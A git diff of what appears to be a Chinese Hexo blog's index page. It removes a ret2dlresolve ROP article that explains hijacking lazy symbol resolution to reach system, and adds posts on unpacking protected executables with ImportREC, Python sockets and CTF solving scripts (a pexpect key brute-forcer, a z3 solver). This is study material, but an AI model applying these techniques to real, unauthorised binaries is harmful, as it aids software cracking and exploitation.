@@ -43,7 +43,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="" class="js-avatar">
+			<img src="/assets/img/avatar.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">IGK_DLS</a></h1>
@@ -79,11 +79,9 @@
 				
 					<a class="github" target="_blank" href="#" title="github"><i class="icon-github"></i></a>
 		        
-					<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
+					<a class="qq" target="_blank" href="/1669630940" title="qq"><i class="icon-qq"></i></a>
 		        
-					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
-		        
-					<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
+					<a class="mail" target="_blank" href="/1669630940@qq.com" title="mail"><i class="icon-mail"></i></a>
 		        
 			</div>
 		</nav>
@@ -101,7 +99,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="" class="js-avatar">
+				<img src="/assets/img/avatar.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">IGK_DLS</h1>
@@ -120,11 +118,9 @@
 					
 						<a class="github" target="_blank" href="#" title="github"><i class="icon-github"></i></a>
 			        
-						<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
+						<a class="qq" target="_blank" href="/1669630940" title="qq"><i class="icon-qq"></i></a>
 			        
-						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
-			        
-						<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
+						<a class="mail" target="_blank" href="/1669630940@qq.com" title="mail"><i class="icon-mail"></i></a>
 			        
 				</div>
 			</nav>
@@ -152,46 +148,23 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-ROP之ret2dlresolve" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Reverse/输入表重建工具ImportREC" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/ROP之ret2dlresolve/">ROP之ret2dlresolve</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/10/ROP之ret2dlresolve/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:25:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="ROP之ret2dlresolve"><a href="#ROP之ret2dlresolve" class="headerlink" title="ROP之ret2dlresolve"></a><strong>ROP之ret2dlresolve</strong></h3><p>首先以一个程序看起，了解其真正的延迟加载过程</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/e80712df161361a0b45af9cbcc49dc21.png" alt="1.png"></p>
-<p>这里call 了read函数，由于是第一次调用，所以需要从libc中查找出对应函数，来研究下它具体的过程是如何的。</p>
-<p>si步入，其进入了read的plt表，并且将要跳转，由图可知，他其实就是跳转到其下一条语句并且会push一个0</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/b2427b3908110ba5da04514b7d702997.png" alt="2.png"></p>
-<p>继续si，跑完push 0x0,栈被推进了一个新值，这个值是十分有用的，后续将会讲解其具体作用。接下来，它将会跳转到0x80482d0，这个位置是plt[0]的位置，来看一下。</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/958b6916d55e05b8855ae237f1d90081.png" alt="3.png"><br>从IDA中查看一下plt[0]的位置<br><img src="/2019/09/10/ROP之ret2dlresolve/5f193d8487bed71f6d0056df98f164c6.png" alt="4.png"><br>再通过objdump查看一下</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/198dc0f4bc3ccbdfc3dd7756c7c0106b.png" alt="5.png"><br>完全一致。</p>
-<p>它跳到这里是要为了什么呢，继续往下看。在这里，它push进去了一个值，这个值是一个十分重要的数据结构的指针，名为linkmap，这个结构里面存储了许多关于libc的信息。</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/94770742f9b8585430a5aa3bfe6cf6e1.png" alt="6.png"><br><img src="/2019/09/10/ROP之ret2dlresolve/a1f557dfe5b438dab95938a211703572.png" alt="7.png"></p>
-<p>图中，栈被推进了一个新值，这个便是linkmap的指针，其中存储了许许多多关于libc的信息，这个结构也是十分重要的，我们在本次学习中并不需要掌握linkmap的具体结构。在图中我们可以看到，再下来这个jmp 将会跳至0xf7fead80执行，这说明我们的程序已经传递完了其该传递的参数，libc会根据其参数获取read函数的真正地址。我们现在已知的参数就只有两个，一个为0，一个为linkmap的指针，这两个参数怎么找到read函数的地址，请继续往下看。</p>
-<p>由于ida与objdump所查找的地址信息一致，所以我是用ida查找地址，更加快捷，当然objdump也可以。</p>
-<p>先看0能使我们找到什么信息。</p>
-<p>程序会 先到.rel.plt(JMPREL) 中去取下标为0的数据</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/410813013ec54a87704c1a3b5a9dbe2d.png" alt="8.png"><br>其中的数据为下图，从ida中也可以很快的看出来<br><img src="/2019/09/10/ROP之ret2dlresolve/a7e7521ad7d1d0056cf9fb4fc7925c4a.png" alt="9.png"><br><img src="/2019/09/10/ROP之ret2dlresolve/83005ad35170acb24f08bcf74a467e58.png" alt="10.png"><br>后面的0x107的作用如下：</p>
-<p>在实际运算中，0x107会被右移8位得到0x1，0x1会被作为下标，在.dynsym(SYMTAB)中查找对应的值，.dynsym的地址如下：<br><img src="/2019/09/10/ROP之ret2dlresolve/e1e582f5e2fd5bbcbf2d53176dacdda5.png" alt="11.png"><br><img src="/2019/09/10/ROP之ret2dlresolve/9be1027e9561ec754d0ee361253a03c7.png" alt="12.png"><br>它会根据gdb中显示的0x1a（即IDA中的 offset aRead - offset byte_804821C 值）继续寻找。</p>
-<p>接下来会将0x1a带入.dynstr(STRTAB)中查找，这次并不是作为下标带入，而是直接用.dynstr的地址 + 0x1a</p>
-<p><img src="/2019/09/10/ROP之ret2dlresolve/46eb463baaaac47c3480c3512614ed5c.png" alt="13.png"><br><img src="/2019/09/10/ROP之ret2dlresolve/ce99ad2676dfec4137d5effb0c921e68.png" alt="14.png"><br>这样便拿到了字符串“read”，libc便知道要查找read的地址。libc从哪来，linkmap便是用来查找它的。</p>
-<p>libc具体的查找策略先不谈，具体是通过Hash实现的，感兴趣的可以自行研究。</p>
-<p>接下来就是攻击方法了，通过上面的跟踪，我们知道其实就是根据call read时栈里先被push进去的0，查找出来最终的字符串“read”,libc只是拿着字符串read去查找地址。那么我们可以通过控制最先push进去的0，写成一个可控的值，使其与.rel.plt结合查找出来的地址可控，并且该地址存储的值也可控，那么我们就可以继续控制0x107,使其与.dynsym查找出来的地址里存储的值可控，进而控制0x1a，使其与.dynstr相加后得到的地址存储的字符串可控，进而获取到真正的system地址。</p>
+        <p>输入表重建工具ImportREC</p>
+<p> 输入表重建工具ImportREC</p>
+<p>　　  Import REConstructor可以从杂乱的IAT中重建一个新的Import表（例如加壳软件等），它可以重建Import表的描述符、IAT和所有的ASCII函数名。用它配合手动脱壳，可以脱UPX、CDilla1、PECompact、PKLite32、Shrinker、ASPack, ASProtect等壳。该工具位于：光盘\tools\PE tools\Rebuilders\Import REConstructor。</p>
+<p><strong>在运行Import REConstructor之前，必须满足如下条件</strong>：<br>1） 目标文件己完全被Dump到另一文件；<br>2） 目标文件必须正在运行中；<br>3） 事先要找到真正的入口点（OEP）；<br>4） 最好加载IceDump，这样建立的输入表较少存在跨平台的问题。<br><strong>步骤如下</strong>：<br>（1）找被脱壳的入口点（OEP）；<br>（2）完全Dump目标文件；<br>（3）运行Import REConstructor和需要脱壳的应用程序；<br>（4）在Import REConstructor下拉列表框中选择应用程序进程；<br>（5）在左下角填上应用程序的真正入口点偏移（OEP）；</p>
+<p>（6）按”IAT AutoSearch”按钮，让其自动检测IAT位置， 出现”Found address which may be in the Original IAT.Try ‘Get Import’”对话框，这表示输入的OEP发挥作用了。</p>
+<p>（7）按”Get Import”按钮，让其分析IAT结构得到基本信息；</p>
+<p>（8）如发现某个DLL显示”valid :NO” ，按”Show Invalids”按钮将分析所有的无效信息，在Imported Function Found栏中点击鼠标右键，选择”Trace Level1 (Disasm)”，再按”Show Invalids”按钮。如果成功，可以看到所有的DLL都为”valid:YES”字样；</p>
+<p>（9）再次刷新”Show Invalids”按钮查看结果，如仍有无效的地址，继续手动用右键的Level 2或3修复；</p>
+<p>（10）如还是出错，可以利用”Invalidate function(s)”、”Delete thunk(s)”、编辑Import表（双击函数）等功能手动修复。</p>
+<p>（11）开始修复已脱壳的程序。选择Add new section (缺省是选上的) 来为Dump出来的文件加一个Section(虽然文件比较大，但避免了许多不必要的麻烦) 。</p>
+<p>（12）按”Fix Dump”按钮，并选择刚在（2）步Dump出来的文件，在此不必要备份。如修复的文件名是”Dump.exe”，它将创建一个”Dump_.exe”，此外OEP也被修正。</p>
+<p>（13）生成的文件可以跨平台运行。</p>
 
       
 
@@ -200,22 +173,11 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">rop,pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/ROP之ret2dlresolve/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/Reverse/输入表重建工具ImportREC/">展开全文 >></a>
         </p>
       
 
@@ -245,39 +207,42 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Python/Python网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/10/hello-world/" class="archive-article-date">
-  	<time datetime="2019-09-10T07:14:32.376Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <p>Python网络编程</p>
+<h3 id="Python网络编程"><a href="#Python网络编程" class="headerlink" title="Python网络编程"></a><strong>Python网络编程</strong></h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket"><a href="#1-创建一个基于TCP连接的Socket" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  socket  #导入socket库</p>
+<p>#创建一个socket</p>
+<p>s  =  socket.socket（socket.AF_INET,socket.SOCK_STREAM）#AF_INET指定使用IPv4协议，如果要用更先进的IPv6，就指定为AF_INET6。SOCK_STREAM指定使用面向流的TCP协议</p>
+<p>host  =  socket.gethostname()<br>print  host</p>
+<p>#设置端口<br>port  =  55555</p>
+<p>#客户端建立连接需要主动，所以是主动connect<br>s.connect((host,port))  #(host,port)是一个元组turple</p>
+<p>#连接成功后发送数据<br>s.send(‘Hello,I&#39;m Client!’)</p>
+<p>#接受服务端发来的数据<br>print  s.recv(1024)  #设置最大值为1024个字节，超出部分放入缓冲区</p>
+<p>#关闭连接<br>s.close()</p>
+<h5 id="2-UDP编程"><a href="#2-UDP编程" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><h1 id="coding-utf-8-1"><a href="#coding-utf-8-1" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  socket</p>
+<p>s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#创建Socket时，SOCK_DGRAM指定了这个Socket的类型是UDP</p>
+<p>host  =  socket.gethostname()<br>port  =  55555</p>
+<p>#s.sendto需要发送的数据与给谁发<br>s.sendto(b’Client’,(host,port))<br>print  s.recv(1024)<br>s.close()</p>
+<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><h5 id="1-创建一个基于TCP连接的Socket-1"><a href="#1-创建一个基于TCP连接的Socket-1" class="headerlink" title="1.创建一个基于TCP连接的Socket"></a><strong>1.创建一个基于TCP连接的Socket</strong></h5><h1 id="coding-utf-8-2"><a href="#coding-utf-8-2" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  socket<br>import  thread<br>s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</p>
+<p>host  =  socket.gethostname()<br>print  host<br>port  =  55555</p>
+<p>#服务端被动建立连接，所以需要指定该程序与哪个socket绑定，需要用bind</p>
+<p>s.bind((host,port))  #(host,port)是一个元组turple</p>
+<p>#设立最大连接数<br>s.listen(5)</p>
+<p>#接受一个新连接<br>sock,addr=s.accept()<br>sock.send(b’Welcome!’)<br>data  =  sock.recv(1024)<br>print  data<br>sock.send(b’I&#39;m Server!’)<br>sock.close()<br>测试服务器的客户端程序如下：</p>
+<h1 id="coding-utf-8-3"><a href="#coding-utf-8-3" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  socket<br>s  =  socket.socket(socket.AF_INET,  socket.SOCK_STREAM)</p>
+<h1 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接:"></a>建立连接:</h1><p>host  =  socket.gethostname()<br>port  =  55555<br>s.connect((host,  port))</p>
+<h1 id="接收欢迎消息"><a href="#接收欢迎消息" class="headerlink" title="接收欢迎消息:"></a>接收欢迎消息:</h1><p>print(s.recv(1024).decode(‘utf-8’))<br>s.send(b’I&#39;m testServer!’)<br>print  s.recv(1024)<br>s.close()</p>
+<h5 id="2-UDP编程-1"><a href="#2-UDP编程-1" class="headerlink" title="2.UDP编程"></a><strong>2.UDP编程</strong></h5><h1 id="coding-utf-8-4"><a href="#coding-utf-8-4" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  socket</p>
+<p>s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</p>
+<p>#绑定端口:<br>host  =  socket.gethostname()<br>port  =  55555<br>s.bind((host,port))<br>print  ‘Bind UDP on 55555’</p>
+<p>#不需要建立连接，直接接收数据</p>
+<p>#s.recvfrom()拿到发送的信息与谁发的(地址与端口)<br>data,addr=s.recvfrom(1024)<br>print  (‘Received from %s:%s’  %  addr)</p>
+<p>#s.sendto需要发送的数据与给谁发<br>s.sendto(b’Hello,%s’  %  data,addr)<br>s.close()<br>测试服务器的客户端程序如下：</p>
+<h1 id="coding-utf-8-5"><a href="#coding-utf-8-5" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  socket<br>s  =  socket.socket(socket.AF_INET,socket.SOCK_DGRAM)<br>host  =  socket.gethostname()<br>port  =  55555</p>
+<p>s.sendto(b’testServer’,(host,port))<br>print  s.recv(1024)<br>s.close()</p>
 
       
 
@@ -290,7 +255,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/Python/Python网络编程/">展开全文 >></a>
         </p>
       
 
@@ -320,6 +285,507 @@
 
 
   
+    <article id="post-Python/Python字符串开头b r u含义" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Python字符串开头b r u含义</p>
+<h3 id="Python字符串开头b-r-u含义"><a href="#Python字符串开头b-r-u含义" class="headerlink" title="Python字符串开头b r u含义"></a><strong>Python字符串开头b r u含义</strong></h3><h4 id="字符串开头b-r-u各含义："><a href="#字符串开头b-r-u各含义：" class="headerlink" title="字符串开头b r u各含义："></a><strong>字符串开头b r u各含义：</strong></h4><blockquote>
+<blockquote>
+<blockquote>
+<p> b’input\n’  # bytes字节符，打印以b开头。<br>b’input\n’<br> r’input\n’  # 非转义原生字符，经处理’\n’变成了’\‘和’n’。也就是\n表示的是两个字符，而不是换行。<br>‘input\n’<br> u’input\n’  # unicode编码字符，python3默认字符串编码方式。<br>‘input\n’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h4 id="str与bytes转换："><a href="#str与bytes转换：" class="headerlink" title="str与bytes转换："></a><strong>str与bytes转换：</strong></h4><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>#在python3环境下运行</p>
+<p>a=’input’<br>print  (a)<br>print  (type(a))</p>
+<p>b=b’input’<br>print  (b)<br>print  (type(b))</p>
+<p>c=u’input’<br>print  (c)<br>print  ((type)(c))</p>
+<p>#str与bytes转换：<br>d=’€20’.encode(‘utf-8’)<br>print  (d,type(d))<br>e=b’\xe2\x82\xac20’.decode(‘utf-8’)<br>print  (e,type(e))</p>
+<p>#str转bytes:<br>f=’123’<br>print  (f,type(f))<br>g=bytes(f,encoding=’utf-8’)<br>print  (g,type(g))<br>print  (str.encode(f),type(str.encode(f)))</p>
+<p>#bytes转str:<br>h=b’123’<br>print  (h,type(h))<br>i=str(h,encoding=’utf-8’)<br>print  (i,type(i))<br>print  (bytes.decode(h),type(bytes.decode(h)))</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/Python字符串开头b r u含义/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/Pythonpexpect" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Pythonpexpect</p>
+<h3 id="Pythonpexpect"><a href="#Pythonpexpect" class="headerlink" title="Pythonpexpect"></a><strong>Pythonpexpect</strong></h3><p><strong>可以与程序进行交互</strong></p>
+<p>#pexpect 的使用说来说去，就是围绕3个关键命令做操作：</p>
+<p>#1. 首先用 spawn 来执行一个程序</p>
+<p>#2. 然后用 expect 来等待指定的关键字，这个关键字是被执行的程序打印到标准输出上面的</p>
+<p>#3. 最后当发现这个关键字以后，根据关键字用 send 方法来发送字符串给这个程序<br>利用实验吧逆向里的tlc作为样本：</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import  base64<br>import  pexpect  #导入pexpect库</p>
+<p>dic=[]</p>
+<p>def  rot(string):  #rot13实现<br>    a=’’<br>    for  i  in  string:<br>        if((ord(i)&gt;=78  and  ord(i)&lt;=90)  or  (ord(i)&gt;=110  and  ord(i)&lt;=122)):<br>            i=chr(ord(i)-13)<br>        else:</p>
+<pre><code>        if  ((ord(i)&gt;=65  and  ord(i)&lt;78)  or  (ord(i)&gt;=97  and  ord(i)&lt;110)):
+
+            i=chr(ord(i)+13)
+    a  +=i
+return  a</code></pre><p>def  findNum(num,a):  #递归找寻符合条件的数字<br>    if  a&gt;=10:<br>        return<br>    for  i  in  range  (0,10,1):<br>        if  (num<em>10+i)%(a+1)==0:<br>            s=str(num)<br>            if  s  not  in  dic:<br>                dic.append(s)<br>            findNum(num</em>10+i,a+1)</p>
+<p>def  main():<br>    findNum(0,0)<br>    print  ‘[<em>] findNum is complete!’<br>    count=0<br>    fout=open(“tlcout.txt”,”w”)  #创建一个新的”tlcout.tct”<br>    for  s  in  dic:<br>        s=base64.b64encode(s)<br>        print  ‘[</em>] base64 is:’+s<br>        s=rot(s)<br>        print  ‘[<em>] rot13 is:’+s<br>        process=pexpect.spawn(‘./tlc’)  #用spawn执行’./tlc’<br>        process.expect(‘Please input key: ‘)  #等待程序直到输出’Please input key: ‘<br>        process.sendline(s)  #向程序发送一行数据：s(自动加回车换行)<br>        process.expect(‘\n’)  #等待程序输出回车换行(‘回车\n换行’)<br>        out=process.read()  #读取程序的输出结果<br>        print  ‘[</em>] out is:’+out<br>        if  ‘Text is:’  in  out:<br>            fout.write(s+’\n’+out[9:]+’\n’)  #文件写操作<br>            print  ‘[<em>] fout.write is:’+s+’\n[</em>] and:’+out[8:]<br>        if  count==200:<br>            print  ‘[*] Now is\n%d\n’%count<br>        count+=1<br>    fout.close()  #文件关闭</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()</p>
+<p>#ZmtkAwH0AmV5</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/Pythonpexpect/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/Python z3-solver" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Python z3-solver</p>
+<h4 id="Python-z3-solver"><a href="#Python-z3-solver" class="headerlink" title="Python z3-solver"></a><strong>Python z3-solver</strong></h4><p>Z3Py的使用方式比较简单，</p>
+<ol>
+<li>定义未知量</li>
+<li>添加约束条件</li>
+<li>然后求解<br>以ISCC2018逆向第二题为例，简单的写第一个代码</li>
+</ol>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>from  z3  import  *</p>
+<p>#定义4个int类型的变量<br>x1  =  Int(‘x1’)<br>x2  =  Int(‘x2’)<br>x3  =  Int(‘x3’)<br>x4  =  Int(‘x4’)</p>
+<p>#创建一个通用求解器<br>s  =  Solver()</p>
+<p>#通过add函数添加约束条件<br>s.add(  x2<em>x1-x4</em>x3  ==  0x24CDF2E7C953DA56)<br>s.add(  3<em>x3+4</em>x4-x2-2<em>x1  ==  0x17B85F06)<br>s.add(  3</em>x1<em>x4-x3</em>x2  ==  0x2E6E497E6415CF3E)<br>s.add(  27<em>x2+x1-11</em>x4  -  x3  ==  0x95AE13337)</p>
+<p>#check()解决声明的约束条件，sat表示找到某个合适的解，unsat表示没有解。这时我们称约束系统无解。<br>print  s.check()</p>
+<p>#model()返回一个解的模型，也可能是一个特解<br>m  =  s.model()<br>print  m<br>print  type(m)</p>
+<p>#m.decls是一个list类型<br>print  m.decls()<br>print  type(m.decls())<br>print  “traversing model…”<br>for  d  in  m.decls():<br>    print  “%s = %s”  %  (d,  m[d])</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/Python z3-solver/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/Python binascii模块" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Python binascii模块</p>
+<h3 id="Python-binascii模块"><a href="#Python-binascii模块" class="headerlink" title="Python binascii模块"></a><strong>Python binascii模块</strong></h3><p>在网络编程中，经常会出现一种情况：想发二进制，却将字符串发了出去，这时候就应该使用这样一个模块，更加方便<br>import  binascii</p>
+<p>def  main():<br>    s  =  ‘hello’<br>    print  s<br>    b  =  binascii.b2a_hex(s)<br>    print  b<br>    print  type(b)<br>    c  =  binascii.a2b_hex(b)<br>    print  c<br>    print  type(c)<br>    b  =  binascii.hexlify(s)<br>    print  b<br>    print  type(b)<br>    c  =  binascii.unhexlify(b)<br>    print  c<br>    print  type(c)</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()<br>运行结果如下：<br><img src="/2019/09/10/Python/Python binascii模块/_resources/f940a338ac1bfab180ef9a9f86c15db9.png" alt><br>注意：<br>a2b:  ascii to binascii？NO！是binascii to ascii，即如果要将十六进制数转化为字符串,用a2b<br>b2a: ascii to binascii，即如果要将字符串转化为十六进制数，用b2a</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/Python/Python binascii模块/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/PythonPIL简单编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>PythonPIL简单编程</p>
+<h3 id="PythonPIL简单编程"><a href="#PythonPIL简单编程" class="headerlink" title="PythonPIL简单编程"></a><strong>PythonPIL简单编程</strong></h3><h4 id="以bugku-ctf-杂项好多数值为例："><a href="#以bugku-ctf-杂项好多数值为例：" class="headerlink" title="以bugku ctf 杂项好多数值为例："></a><strong>以bugku ctf 杂项好多数值为例：</strong></h4><h5 id="该题数据类似："><a href="#该题数据类似：" class="headerlink" title="该题数据类似："></a><strong>该题数据类似：</strong></h5><p>//其给的是每个坐标的颜色<br>255,255,255<br>255,255,255<br>255,255,255<br>255,255,255<br>255,255,255<br>255,255,255<br>249,253,254<br>249,255,255<br>248,255,250<br>253,255,245<br>255,248,220<br>229,136,79<br>251,127,53<br>252,125,44<br>255,129,45<br>255,131,41<br>252,127,35<br>250,127,31</p>
+<h5 id="脚本如下"><a href="#脚本如下" class="headerlink" title="脚本如下:"></a><strong>脚本如下:</strong></h5><p>from  PIL  import  Image  # 此处import * 不对</p>
+<p>x  =  503<br>y  =  122</p>
